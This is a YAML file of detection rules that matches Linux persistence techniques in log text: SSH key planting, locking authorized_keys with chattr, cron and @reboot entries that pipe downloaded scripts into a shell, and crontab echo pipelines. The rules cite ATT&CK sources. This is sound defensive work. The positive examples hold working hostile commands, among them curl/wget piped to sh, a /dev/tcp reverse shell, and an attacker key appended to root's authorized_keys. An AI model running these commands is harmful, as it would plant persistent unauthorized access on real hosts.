# Mention patterns for persistence and privilege shapes written in free text: SSH key planting, cron and systemd
# entries that run downloaders, preload hijacks, setuid shells, root-equivalent accounts and sudoers grants on Linux;
# accessibility backdoors, autoruns, scheduled tasks, services and local admin accounts on Windows. Sources are
# SigmaHQ rules and the procedure text of the cited ATT&CK techniques (vendored Enterprise 20.0).
#
# Persistence edits by configuration management look similar, so the strong entries require what such tools do not
# do: a downloader or socket inside the persisted command, a temp-directory payload, or a root-equivalent grant.

- id: mention.persist_authorized_keys_echo_append
  title: 'echo of an SSH public key with >> into authorized_keys'
  match:
    anchored: 'echo {1,3}["'']?(?:ssh-(?:rsa|ed25519|dss)|ecdsa-sha2-nistp[0-9]{3}) [A-Za-z0-9+/]{40,1000}={0,3}[^\n]{0,120}>> {0,2}[^\n]{0,80}authorized_keys'
  case_sensitive: false
  strength: medium
  attack: [T1098.004]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1098.004 SSH Authorized Keys
    url: https://attack.mitre.org/techniques/T1098/004
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1098.004
  rationale: >-
    Author-composed shape from the technique text (authorized_keys). Appending a key to authorized_keys from the
    command line is how worms (TeamTNT, Kinsing) and hands-on intruders keep SSH access. Administrators normally use
    ssh-copy-id or configuration management, but some paste keys by hand, so for an ordinary account it is medium; the
    root-account entry is strong.
  examples:
    positive:
      - 'Nov 20 13:00:00 web01 bash[800]: HISTORY: echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7vH3kq2mZ9xY1pQ8rT5uW4e attacker" >> /home/www/.ssh/authorized_keys'
    negative:
      - 'Nov 20 13:00:01 web01 sshd[801]: Authentication refused: bad ownership or modes for file /home/alice/.ssh/authorized_keys'
      - 'Nov 20 13:00:02 web01 bash[802]: HISTORY: ssh-copy-id -i ~/.ssh/id_ed25519.pub alice@web02'

- id: mention.persist_root_authorized_keys_append
  title: 'SSH public key with >> into /root/.ssh/authorized_keys'
  match:
    anchored: 'ssh-(?:rsa|ed25519|dss) [A-Za-z0-9+/]{40,1000}={0,3}[^\n]{0,120}>> {0,2}/root/\.ssh/authorized_keys'
  case_sensitive: false
  strength: medium
  attack: [T1098.004]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1098.004 SSH Authorized Keys
    url: https://attack.mitre.org/techniques/T1098/004
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1098.004
  rationale: >-
    Author-composed shape from T1098.004: a key written straight into root's authorized_keys from a command line.
    Cloud worms and exploit payloads do this, and so do first-boot provisioning scripts on images without cloud-init,
    so it is medium; the key comment and the process that wrote it decide.
  examples:
    positive:
      - 'Nov 20 13:01:00 web01 sh[803]: echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDf3kq2mZ9xY1pQ8rT5uW4eZ0b root@x >> /root/.ssh/authorized_keys'
    negative:
      - 'Nov 20 13:01:01 web01 sshd[804]: Accepted publickey for root from 10.0.4.12 port 50122 ssh2: RSA SHA256:3q2+7w'
      - 'Nov 20 13:01:02 web01 bash[805]: HISTORY: cat /root/.ssh/authorized_keys'

- id: mention.persist_authorized_keys_immutable
  title: 'chattr +i or +a on authorized_keys (command text)'
  match:
    anchored: 'chattr {1,3}\+[aiu]{1,3} {1,3}[^\n]{0,80}authorized_keys'
  case_sensitive: false
  strength: medium
  attack: [T1098.004, T1222.002]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1222.002 Linux and Mac File and Directory Permissions Modification (TeamTNT procedure)
    url: https://attack.mitre.org/techniques/T1222/002
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1222.002
  rationale: >-
    TeamTNT's documented chattr use (T1222.002), applied to the key file of T1098.004: locking authorized_keys after
    planting a key stops removal. Some hardening guides also freeze key files, so it is medium.
  examples:
    positive:
      - 'Nov 20 13:02:00 web01 sh[806]: chattr +ia /root/.ssh/authorized_keys'
    negative:
      - 'Nov 20 13:02:01 web01 bash[807]: HISTORY: chattr +i /etc/resolv.conf'
      - 'Nov 20 13:02:02 web01 bash[808]: HISTORY: chmod 600 ~/.ssh/authorized_keys'

- id: mention.persist_cron_every_minute_downloader
  title: 'Cron schedule line with a downloader and a pipe into a shell'
  match:
    anchored: '\* \* \* \* [^\n]{0,60}(?:curl|wget)[^\n]{1,200}\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
  case_sensitive: false
  strength: strong
  attack: [T1053.003, T1105]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1053.003 Cron
    url: https://attack.mitre.org/techniques/T1053/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1053.003
  rationale: >-
    Author-composed shape from the technique text (crontab); strong because the line pipes remote content into a shell
    on a timer. A crontab line (every minute or every N minutes, both end in '* * * *') that fetches a script and
    pipes it into a shell re-infects the host on a timer; it is the persistence of miners and botnets. Scheduled
    maintenance runs local scripts, not remote content piped into a shell.
  examples:
    positive:
      - 'Nov 20 13:03:00 web01 CRON[809]: (www-data) CMD (*/5 * * * * curl -fsSL http://203.0.113.7/cr.sh | sh)'
      - '* * * * * root wget -q -O- http://198.51.100.2/u | bash'
    negative:
      - 'Nov 20 13:03:01 web01 CRON[810]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)'
      - '*/5 * * * * root /usr/local/bin/backup.sh > /dev/null 2>&1'

- id: mention.persist_cron_reboot_payload
  title: '@reboot cron line with a pipe into a shell, a socket or a temp-directory payload'
  match:
    anchored: '@reboot[^\n]{1,200}(?:\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|/dev/tcp/|nc -e |(?:/tmp|/var/tmp|/dev/shm)/[^\s/]{1,60})'
  case_sensitive: false
  strength: strong
  attack: [T1053.003, T1105]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1053.003 Cron
    url: https://attack.mitre.org/techniques/T1053/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1053.003
  rationale: >-
    An @reboot job that pipes downloaded content into a shell, opens a bash socket or runs a file from a temp
    directory restores an implant at every boot; the technique's procedure examples include @reboot persistence
    (GoldMax, The Gentlemen ransomware). Health pings ('@reboot curl -fsS https://hc-ping... > /dev/null') and local
    scripts are not matched.
  examples:
    positive:
      - '@reboot /bin/bash -c "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"'
      - '@reboot sleep 60 && /tmp/.vmware-authd'
    negative:
      - '@reboot /usr/local/bin/start-dashboard.sh'
      - 'Nov 20 13:04:00 web01 cron[700]: (CRON) INFO (Running @reboot jobs)'
      - '@reboot curl -fsS -m 10 --retry 5 -o /dev/null https://hc-ping.example.org/eb095278'

- id: mention.persist_crontab_from_echo_downloader
  title: 'echo of a downloader-and-shell-pipe or socket line into crontab -'
  match:
    anchored: 'echo [^\n]{1,120}(?:(?:curl|wget) [^\n|]{1,150}\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|/dev/tcp/)[^\n]{0,60}\| {0,2}crontab {1,3}-'
  case_sensitive: false
  strength: strong
  attack: [T1053.003, T1105]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1053.003 Cron
    url: https://attack.mitre.org/techniques/T1053/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1053.003
  rationale: >-
    Author-composed shape from the technique text (crontab). Replacing a user's crontab with echoed text whose command
    pipes remote content into a shell (or opens a bash socket) installs scheduled re-infection in one command, the
    usual exploit-payload persistence. Health-check pings without a shell pipe are not matched.
  examples:
    positive:
      - 'Nov 20 13:05:00 web01 sh[811]: echo "*/10 * * * * wget -q -O - http://203.0.113.7/a | sh" | crontab -'
    negative:
      - 'Nov 20 13:05:01 web01 bash[812]: HISTORY: echo "0 2 * * * /usr/local/bin/backup.sh" | crontab -'
      - 'Nov 20 13:05:02 web01 bash[813]: HISTORY: crontab -l'
      - 'echo ''*/5 * * * * curl -fsS -m 10 https://hc-ping.example.org/eb095278'' | crontab -'

- id: mention.persist_crontab_append_pipeline
  title: 'crontab -l; echo ... | crontab - pipeline text'
  match:
    anchored: 'crontab {1,3}-l[^\n]{0,20}; {0,2}echo [^\n]{1,300}\| {0,2}crontab {1,3}-'
  case_sensitive: false
  strength: medium
  attack: [T1053.003]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1053.003 Cron
    url: https://attack.mitre.org/techniques/T1053/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1053.003
  rationale: >-
    Author-composed shape from the technique text (crontab). '(crontab -l; echo "...") | crontab -' adds a job without
    an editor, which is how scripts and intruders persist. Install scripts use it too, so it is medium; the appended
    command decides.
  examples:
    positive:
      - 'Nov 20 13:06:00 web01 sh[814]: (crontab -l 2>/dev/null; echo "@hourly /tmp/.x/upd") | crontab -'
    negative:
      - 'Nov 20 13:06:01 web01 bash[815]: HISTORY: crontab -l > /tmp/cron.bak'
      - 'Nov 20 13:06:02 web01 bash[816]: HISTORY: crontab -e'

